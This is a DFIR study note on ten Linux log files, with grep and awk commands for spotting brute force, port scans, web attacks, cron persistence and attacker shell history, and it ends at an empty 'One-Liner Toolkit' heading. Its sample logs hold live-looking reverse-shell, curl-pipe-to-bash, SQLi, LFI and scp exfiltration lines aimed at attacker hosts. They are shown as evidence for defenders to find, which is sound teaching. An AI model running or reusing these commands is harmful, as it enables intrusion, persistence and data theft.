---
title: Linux Logs — Complete DFIR Reference
aliases:
  - Linux Log Analysis
  - Log Forensics
  - DFIR Logs
tags:
  - dfir
  - linux
  - forensics
  - log-analysis
  - incident-response
  - cywarx
  - unit-iv
created: 2026-05-14
updated: 2026-05-14
status: complete
type: reference
course: Digital Forensics — Unit IV
difficulty: intermediate
---

# 🗂️ Linux Logs — Complete DFIR Reference

> [!abstract] Overview
> This note covers **10 critical Linux log files** — what they store, why they matter in forensics & pentesting, and exact commands with real output examples. Use this as your go-to reference during incident response, VAPT engagements, and CTF challenges.

---

## 📌 Quick Reference Map

```
/var/log/
├── 🔐 auth.log          ← WHO logged in (SSH, sudo, PAM)
├── ⚙️  syslog            ← WHAT the system was doing (general events)
├── 🔬 kern.log          ← HOW the kernel behaved (hardware, modules)
├── 🛡️  ufw.log           ← WHICH IPs hit the firewall (network traffic)
├── 📦 dpkg.log          ← WHAT was installed/removed (packages)
├── ⏰ cron.log          ← WHAT ran automatically (scheduled jobs)
├── apache2/
│   ├── 🌐 access.log    ← EVERY web request (HTTP traffic)
│   └── ⚠️  error.log     ← WEB SERVER failures (PHP errors, misconfig)
└── mysql/
    └── 🗄️  error.log     ← DATABASE events (auth failures, crashes)

~/.bash_history            ← WHAT the user typed (command trail)
```

---

## 🔥 DFIR Priority Order

> [!tip] Incident Response — Log Check Order
> When you suspect a compromise, check logs in this order:
> 
> ```
> 1️⃣  auth.log       → Who got in? When? From where?
> 2️⃣  ufw.log        → What IPs were connecting/scanning?
> 3️⃣  dpkg.log       → Did they install hacker tools?
> 4️⃣  bash_history   → What did they actually do?
> 5️⃣  cron.log       → Did they plant persistence?
> 6️⃣  kern.log       → Did they load a rootkit?
> 7️⃣  access.log     → Was it a web-based entry point?
> 8️⃣  syslog         → Fill in the gaps on timeline
> ```

---

## 🔐 auth.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/auth.log`
> **Purpose:** Tracks every authentication and authorization event on the system.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `May 14 09:10:01` | Exact time of event |
| Hostname | `hexx` | Which machine |
| Service | `sshd`, `sudo`, `su` | What was used to authenticate |
| Username | `root`, `hexx` | Who tried to log in |
| Source IP | `45.33.32.156` | Where they connected from |
| Result | `Failed password`, `Accepted` | Did it succeed? |
| PAM reason | `session opened`, `auth failure` | Why it failed |

### 🧩 Types of Events Captured

- **SSH Login Attempts** — Every connection to port 22, success and failure
- **sudo Commands** — Which user ran what with root privileges
- **su (Switch User)** — User switching to another account
- **PAM Failures** — Password auth failures from any PAM-aware service
- **Account Lockouts** — Too many failed attempts
- **Session Open/Close** — When a user's login session starts and ends
- **New user creation** — `useradd`, `passwd` changes

### 💡 Why It Matters in DFIR

> [!warning] Forensic Significance
> This is the **#1 first log** to open in any intrusion investigation.
> - Brute-force SSH attacks → hundreds of "Failed password" lines from one IP
> - Credential stuffing → multiple usernames tried from same IP  
> - Post-compromise sudo abuse → attacker escalating privileges
> - Lateral movement → `su` to other accounts after initial access

### 💻 Commands & Real Output

**View last 20 lines:**
```bash
tail -20 /var/log/auth.log
```
```
May 14 09:10:01 hexx sshd[12345]: Failed password for root from 45.33.32.156 port 4911 ssh2
May 14 09:10:03 hexx sshd[12346]: Failed password for root from 45.33.32.156 port 4912 ssh2
May 14 09:10:05 hexx sshd[12347]: Failed password for root from 45.33.32.156 port 4913 ssh2
May 14 09:12:44 hexx sshd[12401]: Accepted password for hexx from 192.168.1.10 port 55234 ssh2
May 14 09:12:44 hexx sshd[12401]: pam_unix(sshd:session): session opened for user hexx
```

**Find all failed SSH logins:**
```bash
grep "Failed password" /var/log/auth.log
```
```
May 14 02:13:12 hexx sshd[9988]: Failed password for invalid user admin from 103.21.44.5 port 59102 ssh2
May 14 02:13:15 hexx sshd[9990]: Failed password for root from 103.21.44.5 port 59110 ssh2
```

**Find all sudo usage:**
```bash
grep "sudo" /var/log/auth.log | grep "COMMAND"
```
```
May 14 10:05:30 hexx sudo: hexx : TTY=pts/1 ; PWD=/home/hexx ; USER=root ; COMMAND=/usr/bin/apt install nmap
```

**Count brute-force IPs (top attackers):**
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -5
```
```
    142 45.33.32.156     ← BRUTE FORCE SUSPECT
     89 103.21.44.5
     34 192.99.11.20
```

**Find successful logins only:**
```bash
grep "Accepted" /var/log/auth.log | awk '{print $1,$2,$3,$9,$11}'
```
```
May 14 09:12:44 hexx 192.168.1.10
May 14 10:55:01 hexx 45.33.32.156   ← Attacker succeeded after brute force!
```

> [!example] Real Scenario
> You see 142 failed logins from `45.33.32.156` then 1 successful login. That IP just brute-forced the server. Next step → check `dpkg.log` to see what they installed.

---

## ⚙️ syslog

> [!warning] Severity: MEDIUM
> **Location:** `/var/log/syslog`
> **Purpose:** The catch-all system diary — collects messages from the kernel, daemons, and userspace.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `May 14 10:22:01` | When event happened |
| Hostname | `hexx` | Which machine |
| Process | `NetworkManager`, `CRON`, `systemd` | What generated the message |
| PID | `[800]` | Process ID |
| Message | `state change: activated` | What actually happened |

### 🧩 Types of Events Captured

- **Daemon start/stop** — When services like cron, NetworkManager, rsyslog start or crash
- **Kernel messages (copy)** — Duplicate of some kern.log messages
- **USB device events** — When a USB stick or device is plugged in or removed
- **Network interface changes** — IP assignment, link up/down events
- **Misc application messages** — Any app that calls `syslog()` C function
- **NTP time sync** — System clock adjustments (important for log correlation!)

### 💡 Why It Matters in DFIR

> [!info] Forensic Significance
> Think of syslog as the **general timeline builder**. It doesn't go deep on any one thing but covers everything. When you need to understand *what the machine was doing* at a specific timestamp, syslog fills the gaps.

### 💻 Commands & Real Output

**Live monitoring (watch events happen in real time):**
```bash
tail -f /var/log/syslog
```
```
May 14 10:22:01 hexx NetworkManager[800]: <info> device 'eth0': state change: activated
May 14 10:22:03 hexx systemd[1]: Started Session 5 of user hexx.
May 14 10:23:01 hexx CRON[13200]: (root) CMD (cd / && run-parts /etc/cron.hourly)
May 14 10:25:11 hexx kernel: usb 1-1: new high-speed USB device number 4 using xhci_hcd
```

**Find service crashes:**
```bash
grep -i "fail\|error\|crash\|killed" /var/log/syslog | tail -8
```
```
May 14 08:44:01 hexx kernel: Out of memory: Killed process 4421 (python3) score 900
May 14 08:45:11 hexx systemd[1]: apache2.service: Main process exited, code=killed
```

**Build a timeline around a specific time:**
```bash
grep "May 14 10:5" /var/log/syslog
```
```
May 14 10:55:01 hexx sshd[14000]: Accepted password for root from 45.33.32.156
May 14 10:55:03 hexx systemd[1]: Started Session 12 of user root.
May 14 10:59:22 hexx apt[14200]: install netcat-openbsd    ← tool installed 4 min after login
```

---

## 🔬 kern.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/kern.log`
> **Purpose:** Raw messages directly from the Linux kernel — hardware, modules, memory, networking.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `May 14 09:00:01` | Kernel event time |
| Kernel tag | `kernel:` | Always from kernel |
| Uptime offset | `[12345.678]` | Seconds since boot |
| Message | `usb 2-1: New USB device found` | What happened |

### 🧩 Types of Events Captured

- **Kernel module load/unload** — Which `.ko` modules were loaded → **rootkit detection!**
- **Hardware errors** — RAM errors, disk I/O failures, PCI bus errors
- **OOM (Out Of Memory) Killer** — When kernel force-kills a process, which one and why
- **USB/PCI device connect** — Physical device events with hardware IDs
- **Kernel panics** — Full crash with stack trace and faulting address
- **Network interface changes** — Promiscuous mode detection (someone sniffing?)
- **iptables/netfilter** — Low-level packet events

### 💡 Why It Matters in DFIR

> [!danger] Forensic Significance
> If an attacker loads a **LKM rootkit (Loadable Kernel Module)**, it appears here. Physical access events (USB boot drives, external storage for data exfiltration) are also captured. This is the deepest-level log available without specialized tools.

### 💻 Commands & Real Output

**View live kernel messages:**
```bash
dmesg | tail -20
```
```
[12345.678901] usb 2-1: new full-speed USB device number 5 using ohci-pci
[12345.901234] usb 2-1: New USB device found, idVendor=0781, idProduct=5567
[12345.901240] usb 2-1: Product: Cruzer Blade         ← USB plugged in
[12350.221100] EXT4-fs (sdb1): mounted filesystem with ordered data mode
[12400.123456] device veth0 entered promiscuous mode  ← SNIFFING DETECTED
```

**Check for OOM kills:**
```bash
grep -i "out of memory\|oom\|killed process" /var/log/kern.log
```
```
May 14 03:11:22 hexx kernel: [89123.4] Out of memory: Killed process 6610 (mysqld) score 892
```

**Detect rootkit module loading (suspicious):**
```bash
grep "module loaded\|insmod\|loading module" /var/log/kern.log
```
```
May 14 09:00:01 hexx kernel: Loading module rootkit.ko into kernel...
May 14 09:00:02 hexx kernel: module: Tainted: G  ← Unsigned/3rd party module
```

**Detect network sniffing:**
```bash
grep -i "promiscuous\|PROMISC" /var/log/kern.log
```
```
May 14 10:55:11 hexx kernel: device eth0 entered promiscuous mode
# Someone is running Wireshark/tcpdump — or worse, a sniffer implant
```

> [!example] Real Scenario
> An attacker with root access loads a rootkit: `insmod evil.ko`. The kernel logs `Loading module evil.ko` and marks the kernel as `Tainted`. Even if they delete the `.ko` file later, the log entry remains.

---

## 🛡️ ufw.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/ufw.log`
> **Purpose:** UFW firewall traffic log — records every BLOCKED and ALLOWED network connection.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Action | `[UFW BLOCK]` | Was it blocked or allowed? |
| Interface | `IN=eth0` | Which network card |
| Source IP | `SRC=103.21.44.5` | Attacker's IP |
| Source Port | `SPT=51234` | Attacker's port |
| Destination IP | `DST=192.168.1.15` | Your server IP |
| Destination Port | `DPT=22` | Target service |
| Protocol | `PROTO=TCP` | TCP or UDP |
| MAC Address | `MAC=aa:bb:cc...` | Physical hardware address |

### 🧩 Types of Events Captured

- **Blocked inbound connections** — Every scan, probe, attack attempt stopped by firewall
- **Allowed connections** — Legitimate traffic that passed through
- **Port scans** — One IP hitting many ports sequentially
- **Reverse shell callbacks** — Outbound connections to attacker C2
- **Data exfiltration** — Large outbound transfers to unknown IPs
- **Lateral movement** — Internal IPs trying to connect to unusual ports

### 💡 Why It Matters in DFIR

> [!warning] Forensic Significance
> This is your **network-level evidence layer**. Pair it with auth.log — if an IP appears in ufw.log (scanning) and then in auth.log (successful login), you have the full attack chain: scan → brute force → access.

### 💻 Commands & Real Output

**View blocked connections:**
```bash
grep "BLOCK" /var/log/ufw.log | tail -10
```
```
May 14 11:02:33 hexx kernel: [UFW BLOCK] IN=eth0 SRC=103.21.44.5 DST=192.168.1.15 PROTO=TCP DPT=22
May 14 11:02:34 hexx kernel: [UFW BLOCK] IN=eth0 SRC=103.21.44.5 DST=192.168.1.15 PROTO=TCP DPT=3306
May 14 11:02:35 hexx kernel: [UFW BLOCK] IN=eth0 SRC=103.21.44.5 DST=192.168.1.15 PROTO=TCP DPT=8080
```

**Detect port scan (one IP, many ports):**
```bash
grep "BLOCK" /var/log/ufw.log | grep "SRC=103.21.44.5" | grep -oP 'DPT=\K\d+' | sort -n
```
```
21
22
23
25
80
443
3306
8080
# Sequential ports = classic Nmap/Masscan port scan
```

**Top attacking IPs:**
```bash
grep "BLOCK" /var/log/ufw.log | grep -oP 'SRC=\K[\d.]+' | sort | uniq -c | sort -rn | head -5
```
```
    312 103.21.44.5
     89 45.33.32.156
     41 192.99.11.20
```

**Detect outbound reverse shells (C2 callbacks):**
```bash
grep "UFW ALLOW" /var/log/ufw.log | grep "OUT=eth0" | grep -v "DPT=80\|DPT=443\|DPT=53"
```
```
May 14 11:05:44 kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.15 DST=103.21.44.5 DPT=4444
# Outbound to port 4444 on attacker IP = reverse shell callback!
```

---

## 🌐 apache2/access.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/apache2/access.log`
> **Purpose:** Every single HTTP request that hits your Apache web server.

### 📦 What Information It Stores

Standard Apache **Combined Log Format:**
```
IP - - [Timestamp] "METHOD /path HTTP/version" ResponseCode Bytes "Referrer" "User-Agent"
```

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Client IP | `103.21.44.5` | Who made the request |
| Timestamp | `[14/May/2026:11:05:01 +0530]` | When |
| Method | `GET`, `POST`, `PUT` | Type of request |
| URI / Path | `/admin/login.php?id=1'` | What was accessed + any payloads |
| Response Code | `200`, `403`, `500` | Did it succeed? |
| Bytes | `4321` | How much data returned |
| Referrer | `https://example.com` | Where they came from |
| User-Agent | `sqlmap/1.7`, `Nikto/2.1.6` | Browser or **hacking tool** |

### 🧩 Types of Events Captured

- **All HTTP requests** — Every GET, POST, PUT, DELETE to your web server
- **Response codes** — 200=success, 403=forbidden, 404=not found, 500=error
- **Attack payloads in URL** — SQLi strings, LFI paths, XSS payloads visible in URI
- **Scanner fingerprints** — Nikto, sqlmap, Burp, Nuclei, Gobuster visible in User-Agent
- **Web shell access** — GET requests to `.php` files in unusual locations
- **File inclusion attempts** — `../../etc/passwd` in URL parameters
- **Sensitive file probing** — `.git/config`, `.env`, `config.php` requests

### 💡 Why It Matters in DFIR

> [!tip] Forensic Significance
> This is the **goldmine for web attack forensics**. Every SQLi payload, every LFI attempt, every web shell access is in here. For bug bounty, it's your primary evidence of vulnerability exploitation.

### 💻 Commands & Real Output

**Live monitor incoming requests:**
```bash
tail -f /var/log/apache2/access.log
```
```
192.168.1.10 - - [14/May/2026:11:05:01 +0530] "GET /index.php HTTP/1.1" 200 4321 "-" "Mozilla/5.0"
103.21.44.5  - - [14/May/2026:11:05:44 +0530] "GET /admin/ HTTP/1.1" 403 289 "-" "sqlmap/1.7"
103.21.44.5  - - [14/May/2026:11:05:45 +0530] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 200 4321 "-" "sqlmap/1.7"
103.21.44.5  - - [14/May/2026:11:05:46 +0530] "GET /../../../etc/passwd HTTP/1.1" 400 512 "-" "Nikto/2.1.6"
```

**Find SQLi attempts:**
```bash
grep -iE "union|select|insert|drop|1=1|or '1'|sleep\(|benchmark\(" /var/log/apache2/access.log | head -5
```
```
103.21.44.5 - [14/May/2026] "GET /index.php?id=1'+UNION+SELECT+1,2,table_name+FROM+information_schema.tables-- HTTP/1.1" 200
103.21.44.5 - [14/May/2026] "GET /login.php?user=admin'--&pass=x HTTP/1.1" 302 0
```

**Find LFI (Local File Inclusion) attempts:**
```bash
grep -iE "\.\./|etc/passwd|etc/shadow|proc/self|/var/www" /var/log/apache2/access.log
```
```
103.21.44.5 - [14/May/2026] "GET /page.php?file=../../../../etc/passwd HTTP/1.1" 200 1234
103.21.44.5 - [14/May/2026] "GET /page.php?file=/proc/self/environ HTTP/1.1" 200 512
```

**Find scanner traffic:**
```bash
grep -iE "nikto|sqlmap|nmap|masscan|burp|nuclei|gobuster|dirbuster|wfuzz|ffuf" /var/log/apache2/access.log | awk '{print $1,$7,$9}' | head -10
```
```
103.21.44.5  /admin/           403
103.21.44.5  /phpmyadmin/      404
103.21.44.5  /.git/config      200   ← GIT REPO EXPOSED!
103.21.44.5  /.env             200   ← .ENV FILE EXPOSED!
```

**Find web shell access:**
```bash
grep -iE "\.php" /var/log/apache2/access.log | grep -v "index\|login\|register\|contact" | grep "200"
```
```
103.21.44.5 - [14/May/2026] "GET /uploads/images/shell.php?cmd=id HTTP/1.1" 200 23
103.21.44.5 - [14/May/2026] "GET /wp-content/uploads/2026/05/img.php?c=whoami HTTP/1.1" 200 15
```

**Find high-volume requests (DoS/DDoS):**
```bash
grep "14/May/2026:11:" /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -5
```
```
  4521 103.21.44.5    ← 4521 requests in 1 hour = DoS attempt
   312 192.168.1.10
    44 8.8.8.8
```

---

## ⚠️ apache2/error.log

> [!warning] Severity: MEDIUM
> **Location:** `/var/log/apache2/error.log`
> **Purpose:** Apache's internal failure log — PHP errors, misconfigurations, access violations.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `[Mon May 14 11:10:01.123 2026]` | When error occurred |
| Module | `[php7:error]`, `[core:error]` | Which Apache module errored |
| PID | `[pid 1234]` | Process that errored |
| Client | `[client 103.21.44.5:51234]` | Who triggered the error |
| Message | `File does not exist: /var/www/html/admin` | What went wrong + **path disclosure** |

### 🧩 Types of Events Captured

- **PHP fatal errors** — Stack traces revealing full server file paths
- **File not found (internal)** — Missing files that were requested  
- **Permission denied** — Apache tried to access a restricted file → path disclosure
- **Module errors** — mod_rewrite, mod_ssl, mod_php failures
- **DB connection errors** — MySQL connection failures from PHP → credential exposure
- **CGI execution errors** — Shell injection attempts through CGI scripts
- **SSL/TLS errors** — Certificate validation failures

### 💡 Why It Matters in DFIR

> [!info] Forensic Significance
> Attackers **intentionally trigger errors** to map the server. PHP error messages reveal: full file paths, PHP version, database names, and variable contents. Also useful in pentesting — when your payload causes an error, the error message itself is the finding.

### 💻 Commands & Real Output

**View latest Apache errors:**
```bash
tail -20 /var/log/apache2/error.log
```
```
[Mon May 14 11:10:01.123456 2026] [php7:error] [pid 1234] script '/var/www/html/shell.php' not found
[Mon May 14 11:10:05.234567 2026] [core:error] [pid 1235] [client 103.21.44.5:51234] File does not exist: /var/www/html/admin
[Mon May 14 11:10:11.345678 2026] [php7:notice] PHP Warning: mysqli_connect(): Access denied for user 'root'@'localhost'
```

**Find information-leaking errors:**
```bash
grep "Permission denied\|file not found\|No such file" /var/log/apache2/error.log | head -5
```
```
[core:error] [client 103.21.44.5] Permission denied: /var/www/html/config/db.php
[core:error] [client 103.21.44.5] File does not exist: /var/www/html/wp-admin
[core:error] [client 103.21.44.5] AH01630: client denied by server configuration: /etc/apache2/.htpasswd
```

**Find DB credential leaks in errors:**
```bash
grep -i "mysql\|password\|credential\|connect" /var/log/apache2/error.log | head -5
```
```
PHP Warning: mysqli_connect(): (HY000/1045): Access denied for user 'webapp'@'localhost' (password: YES)
# Reveals: DB username = webapp, DB is on localhost
```

---

## ⏰ cron.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/syslog` (grep CRON) or `/var/log/cron.log` on some distros
> **Purpose:** Records every scheduled job (cron) execution.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `May 14 11:00:01` | When the job ran |
| User | `(root)`, `(www-data)` | Which user's cron ran |
| Action | `CMD`, `RELOAD`, `BEGIN EDIT` | What cron did |
| Command | `/usr/bin/python3 /tmp/update.py` | The actual command executed |

### 🧩 Types of Events Captured

- **Cron job execution** — Which user ran what command at what time
- **Cron daemon events** — crond start/stop, crontab reload
- **New crontab installed** — When a user adds or modifies their crontab
- **Failed executions** — Jobs that couldn't run
- **@reboot entries firing** — Persistence mechanisms activating on startup

### 💡 Why It Matters in DFIR

> [!danger] Forensic Significance
> **Cron is the #1 attacker persistence mechanism.** After getting a shell, attackers add a reverse shell to crontab so it reconnects every minute. If you see unexpected commands — especially ones pointing to `/tmp/`, unusual scripts, or `bash -i >& /dev/tcp/` — assume compromise.

### 💻 Commands & Real Output

**View cron execution history:**
```bash
grep CRON /var/log/syslog | tail -15
```
```
May 14 11:00:01 hexx CRON[14501]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)
May 14 11:00:01 hexx CRON[14502]: (root) CMD (/usr/bin/python3 /tmp/.hidden_shell.py)
May 14 11:00:02 hexx CRON[14503]: (www-data) CMD (/bin/bash -i >& /dev/tcp/103.21.44.5/4444 0>&1)
#                                                                ^^^ REVERSE SHELL IN CRON — COMPROMISED
```

**Check ALL users' current crontabs:**
```bash
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u $user -l 2>/dev/null | grep -v "^#\|^$" | sed "s/^/$user: /"
done
```
```
root: * * * * * /tmp/.update_checker.sh
root: @reboot /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/443 0>&1'
www-data: */5 * * * * curl http://103.21.44.5/beacon.sh | bash
```

**Find recently modified crontab files:**
```bash
find /etc/cron* /var/spool/cron -newer /etc/passwd -ls 2>/dev/null
```
```
12345 4 -rw------- 1 root root 87 May 14 10:59 /var/spool/cron/crontabs/root
# Modified at 10:59 — same time as the SSH intrusion!
```

**List all system-wide cron jobs:**
```bash
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
```
```
/etc/cron.d/:
-rw-r--r-- 1 root root  102 Feb 13  2025 .placeholder
-rw-r--r-- 1 root root   29 May 14 11:01 update_helper    ← NEW suspicious file
```

> [!example] Real Scenario
> Attacker gets shell via SQLi → uploads PHP webshell → uses webshell to add crontab entry for `www-data` user → every 5 minutes a new reverse shell connects back. You find this by: (1) access.log shows webshell access, (2) cron.log shows www-data running `curl | bash`, (3) ufw.log shows outbound to attacker IP on port 4444.

---

## 📦 dpkg.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/dpkg.log`
> **Purpose:** Tracks every package install, upgrade, remove, and configure via apt/dpkg.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `2026-05-14 10:59:22` | When package action happened |
| Action | `install`, `upgrade`, `remove`, `purge` | What was done |
| Package name | `netcat-openbsd:amd64` | What software |
| Old version | `<none>` | Was it already installed? |
| New version | `1.218-4ubuntu1` | What version was installed |

### 🧩 Types of Events Captured

- **New installs** — Fresh package installs with exact timestamp
- **Upgrades** — Version changes
- **Removals** — Package uninstalled (attacker cleaning up?)
- **Purges** — Package + config files deleted
- **Status changes** — half-installed, installed, config-files states
- **Dependency installs** — Everything that got pulled in automatically

### 💡 Why It Matters in DFIR

> [!warning] Forensic Significance
> After getting shell access, attackers install **hacking tools**: `nmap`, `netcat`, `socat`, `python3`, `gcc` (for compiling exploits). These installs are **timestamped** in dpkg.log — correlate with auth.log to prove what happened after the attacker logged in.

### 💻 Commands & Real Output

**View all installs today:**
```bash
grep "$(date '+%Y-%m-%d')" /var/log/dpkg.log | grep " install "
```
```
2026-05-14 10:59:22 install netcat-openbsd:amd64 <none> 1.218-4ubuntu1
2026-05-14 10:59:45 install socat:amd64 <none> 1.7.4.1-3
2026-05-14 11:00:01 install nmap:amd64 <none> 7.80+dfsg1-2build1
2026-05-14 11:00:22 install gcc:amd64 <none> 4:11.2.0-1ubuntu1
# All installed 4 minutes after unauthorized SSH login at 10:55!
```

**Timeline correlation (attacker's toolkit):**
```bash
grep "install\|remove" /var/log/dpkg.log | grep "2026-05-14 11:"
```
```
2026-05-14 11:00:01 install nmap:amd64 <none> 7.80
2026-05-14 11:00:22 install gcc:amd64 <none> 4:11.2
2026-05-14 11:42:11 remove nmap:amd64 7.80 <none>        ← removed after use
2026-05-14 11:45:33 purge netcat-openbsd:amd64 1.218 <none>  ← tried to clean up
# dpkg.log caught it even though they removed the tools!
```

**Find ALL historical installs (ever):**
```bash
grep " install " /var/log/dpkg.log | awk '{print $1, $2, $4}' | less
```

---

## 🗄️ mysql/error.log

> [!danger] Severity: CRITICAL
> **Location:** `/var/log/mysql/error.log`
> **Purpose:** MySQL engine-level events — auth failures, startup, crashes, InnoDB recovery.

### 📦 What Information It Stores

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Timestamp | `2026-05-14T09:01:05.123Z` | ISO 8601 timestamp |
| Thread ID | `45` | Connection/thread number |
| Level | `[Warning]`, `[ERROR]`, `[System]` | Severity |
| Message | `Access denied for user 'root'@'103.21.44.5'` | What happened |

### 🧩 Types of Events Captured

- **Failed authentication** — Wrong password for DB user, from which IP
- **Remote connection attempts** — Who tried to connect and from where
- **Startup/shutdown timestamps** — When DB started — important for timeline
- **Crashed tables** — InnoDB recovery after abnormal termination
- **Privilege errors** — User trying to access tables they can't
- **UDF loading** — Attackers load malicious `.so` files as User Defined Functions

### 💡 Why It Matters in DFIR

> [!danger] Forensic Significance
> SQLi attacks that cause DB errors leave traces here. More critically, attackers who get DB access often try **MySQL UDF privilege escalation** — loading a malicious shared library to execute OS commands as the MySQL user (often root). This shows up in error.log.

### 💻 Commands & Real Output

**View MySQL error log:**
```bash
sudo tail -20 /var/log/mysql/error.log
```
```
2026-05-14T09:01:05.123456Z 0 [System] /usr/sbin/mysqld (mysqld 8.0.32) starting
2026-05-14T10:55:12.234567Z 45 [Warning] Access denied for user 'root'@'103.21.44.5' (using password: YES)
2026-05-14T10:55:13.345678Z 46 [Warning] Access denied for user 'admin'@'103.21.44.5' (using password: YES)
2026-05-14T10:55:14.456789Z 47 [Warning] Access denied for user 'root'@'103.21.44.5' (using password: NO)
# 3 attempts from same IP = DB brute force after SQLi found creds
```

**Enable general query log (see ALL queries):**
```sql
-- Run in MySQL console:
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';
```
```bash
tail -f /var/log/mysql/general.log
```
```
2026-05-14T11:05:01Z  89 Query  SELECT * FROM users WHERE id=1 UNION SELECT 1,2,table_name FROM information_schema.tables--
2026-05-14T11:05:02Z  89 Query  SELECT user,password FROM mysql.user
# Classic SQLi → dumping password hashes
```

**Find DB brute force from specific IP:**
```bash
grep "Access denied" /var/log/mysql/error.log | grep "103.21.44.5" | wc -l
```
```
47
# 47 failed login attempts from attacker IP
```

---

## 💀 ~/.bash_history

> [!danger] Severity: CRITICAL
> **Location:** `~/.bash_history` (per-user, in their home directory)
> **Purpose:** Every bash command the user typed — the attacker's command notebook.

### 📦 What Information It Stores

> [!note] Format
> By default, just the commands — no timestamps. With `HISTTIMEFORMAT` set, full timestamps appear.

| Field | Example | What It Tells You |
|-------|---------|-------------------|
| Command | `wget http://103.21.44.5/shell.py` | What they downloaded |
| Arguments | `-o /tmp/.hidden` | Where they saved it |
| Path context | `cd /tmp/.hidden/` | Where they were working |
| Targets | `ssh root@10.0.0.5` | Where they pivoted to |
| Cleanup | `history -c` | They knew they were being watched |

### 🧩 Types of Events Captured

- **Recon commands** — `whoami`, `id`, `uname -a`, `cat /etc/passwd`, `ss -tulpn`
- **Download commands** — `wget`, `curl` downloading tools or payloads
- **Privilege escalation** — `sudo -l`, `find / -perm -4000`, exploit compilation
- **Persistence setup** — `crontab -e`, editing `/etc/rc.local`
- **Lateral movement** — `ssh user@10.x.x.x` to other machines
- **Data exfiltration** — `cat /etc/shadow`, `mysqldump`, `zip` and `scp` to external IP
- **Cleanup attempts** — `history -c`, `rm ~/.bash_history`, `unset HISTFILE`

### 💡 Why It Matters in DFIR

> [!danger] Forensic Significance
> This is literally the **attacker's handwritten notes** — they often forget to clear it, or clear only partially. Even if wiped, disk forensics (Autopsy, Sleuth Kit) can recover deleted history. The **absence of history on an active account is itself suspicious**.

### 💻 Commands & Real Output

**View your own history:**
```bash
cat ~/.bash_history
```
```
ls -la /tmp
wget http://103.21.44.5:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/out.txt
find / -perm -4000 2>/dev/null
sudo -l
gcc exploit.c -o exploit
./exploit
whoami
id
cat /etc/shadow
ssh root@10.0.0.5
history -c               ← They tried to clear it but it's already here
```

**Check history of ALL users (root required):**
```bash
for u in /home/* /root; do
  echo "=== $u ==="
  cat "$u/.bash_history" 2>/dev/null | head -10
done
```
```
=== /home/hexx ===
./linpeas.sh
sudo su
=== /home/www-data ===
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /etc/passwd
=== /root ===
cat /etc/shadow
crontab -e
mysqldump -u root -p webapp > /tmp/db_dump.sql
scp /tmp/db_dump.sql attacker@103.21.44.5:/tmp/
```

**Find cleanup evidence (self-incriminating):**
```bash
grep -iE "history -c|rm.*bash_history|HISTFILE|unset HIST" ~/.bash_history
```
```
history -c
rm -rf ~/.bash_history
export HISTFILE=/dev/null
# The fact these exist means cleanup was INCOMPLETE
```

**Enable timestamps for future history:**
```bash
echo 'export HISTTIMEFORMAT="%F %T "' >> ~/.bashrc && source ~/.bashrc
history | head -10
```
```
1  2026-05-14 10:58:43  ssh hexx@192.168.1.15
2  2026-05-14 10:59:01  wget http://103.21.44.5/shell.py
3  2026-05-14 10:59:22  python3 shell.py
```

**Increase history size and make it append (not overwrite):**
```bash
# Add to ~/.bashrc:
HISTSIZE=10000
HISTFILESIZE=20000
HISTTIMEFORMAT="%F %T "
shopt -s histappend
export HISTFILE=~/.bash_history
```

> [!example] Real Scenario
> You recover the bash_history of `www-data` (web server user). It shows: `python3 -c 'import pty;pty.spawn("/bin/bash")'` — this means a web shell was used to spawn an interactive shell. Then `cat /etc/passwd` and `cat /etc/shadow` — credential harvesting. Then `ssh root@10.0.0.2` — lateral movement attempt. This entire attack chain is in 6 lines of bash_history.

---

## 🔗 Attack Chain Correlation

> [!tip] Connecting the Logs — Full Attack Timeline Example
> 
> Here's how all logs connect for a **typical web application compromise:**

```
TIME     LOG              EVENT
──────────────────────────────────────────────────────────────────
10:50    ufw.log         → 103.21.44.5 scanning ports 21,22,80,443,3306,8080
10:55    apache/access   → Nikto scan + sqlmap hitting /index.php?id=
10:57    mysql/error     → 47 "Access denied" attempts from 103.21.44.5
10:58    apache/access   → GET /index.php?id=1 UNION SELECT ... returns 200
10:59    apache/access   → POST /uploads/shell.php (webshell uploaded)
10:59    auth.log        → SSH: Accepted password for root from 103.21.44.5
10:59    dpkg.log        → install netcat-openbsd, nmap, gcc
11:00    cron.log        → (root) CMD /tmp/.update.sh  ← NEW persistence entry
11:00    ufw.log         → ALLOW OUT DPT=4444 to 103.21.44.5 (reverse shell!)
11:01    bash_history    → ./linpeas.sh, cat /etc/shadow, ssh 10.0.0.5
11:05    kern.log        → Loading module rootkit.ko (LKM rootkit installed!)
11:45    dpkg.log        → remove nmap, purge netcat (cleanup attempt)
11:46    bash_history    → history -c (tried to erase tracks — too late)
```

---

## 🛠️ One-Liner Toolkit

